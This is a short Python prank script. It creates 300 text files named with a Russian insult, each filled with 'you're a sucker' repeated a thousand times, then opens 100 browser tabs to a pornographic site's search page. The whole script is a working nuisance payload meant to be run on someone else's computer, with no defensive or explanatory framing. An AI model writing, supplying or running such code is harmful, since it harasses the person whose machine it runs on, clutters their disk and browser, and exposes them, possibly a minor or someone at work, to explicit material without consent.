import os, webbrowser

col = 300
if True:
    for i in range(1, col + 1):
        handle = open(f"лох-{i}.txt", "w")
        handle.write("you're a sucker " * 1000)
        handle.close()
else:
    for i in range(1, col + 1):
        os.remove(f"лох-{i}.txt")

for i in range(100):
    webbrowser.open('https://www.pornhub.com/video/search?search=porno', new=2)
